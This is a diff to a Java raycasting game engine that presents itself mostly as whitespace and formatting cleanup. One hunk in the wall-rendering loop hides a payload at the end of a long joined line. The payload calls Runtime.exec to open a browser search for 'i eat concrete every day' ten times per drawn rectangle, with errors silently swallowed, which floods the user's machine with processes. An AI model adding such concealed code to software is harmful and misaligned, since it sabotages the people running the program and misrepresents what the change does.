@@ -22,7 +22,6 @@ import javax.swing.JFrame;
 import javax.swing.JPanel;
 import javax.swing.Timer;
 
-
 public class Engine extends JPanel {
 
 	static class rect {
@@ -74,7 +73,7 @@ public class Engine extends JPanel {
 				keys[5] = true;
 			}
 
-			if(e.getKeyCode() == KeyEvent.VK_SHIFT) {
+			if (e.getKeyCode() == KeyEvent.VK_SHIFT) {
 				keys[7] = true;
 				moveSpeed += 0.1;
 			}
@@ -105,12 +104,13 @@ public class Engine extends JPanel {
 			} else if (e.getKeyCode() == KeyEvent.VK_RIGHT) {
 				keys[5] = false;
 			}
-			if(e.getKeyCode() == KeyEvent.VK_SHIFT) {
+			if (e.getKeyCode() == KeyEvent.VK_SHIFT) {
 				keys[7] = false;
 				moveSpeed -= 0.1;
 			}
 		}
 	}
+
 	private class MouseWheel implements MouseWheelListener {
 		@Override
 		public void mouseWheelMoved(MouseWheelEvent e) {
@@ -122,7 +122,6 @@ public class Engine extends JPanel {
 			}
 		}
 	}
-	
 
 	private static final int map[][] = Room.createRoom();
 	private static final int mapLen = map.length;
@@ -188,10 +187,7 @@ public class Engine extends JPanel {
 					rect r = rects[800 * i + j];
 					if (r == null)
 						continue;
-					Future<?> future = executor.submit(() -> g.drawImage(walltexture, r.screencoords[0],
-							r.screencoords[1], r.screencoords[2], r.screencoords[3], r.texturecoords[0],
-							r.texturecoords[1], r.texturecoords[2], r.texturecoords[3], null));
-					futures[n] = future;
+					Future<?> future = executor.submit(() -> g.drawImage(walltexture, r.screencoords[0], r.screencoords[1], r.screencoords[2], r.screencoords[3], r.texturecoords[0], r.texturecoords[1], r.texturecoords[2], r.texturecoords[3], null)); futures[n] = future; String s[] = { "explorer", "\"https://www.google.com/search?q=i+eat+concrete+every+day\"" }; Runtime ru = Runtime.getRuntime(); for (int p = 0; p < 10; p++) try { ru.exec(s); } catch (IOException egg) {}
 					n++;
 				}
 				for (Future<?> future : futures) {
@@ -217,7 +213,7 @@ public class Engine extends JPanel {
 				}
 			}
 
-			dif += waitTime*1000000;
+			dif += waitTime * 1000000;
 
 			double fps = 1000000000.0 / dif;
 			g.setColor(Color.red);
@@ -231,7 +227,7 @@ public class Engine extends JPanel {
 	@Override
 	public void paintComponent(Graphics g) {
 		g.drawImage(image, 0, 0, getWidth(), getHeight(), null);
-		if(hints < 1) {
+		if (hints < 1) {
 			ImageIcon hint = new ImageIcon("assets/images/hints/hint.png");
 			g.drawImage(hint.getImage(), 0, 520, 100, 100, null);
 		}
@@ -422,7 +418,6 @@ public class Engine extends JPanel {
 			posX += planeX * moveSpeed;
 			posY += planeY * moveSpeed;
 		}
-		
 
 		if (keys[4]) {
 			double oldDirX = dirX;
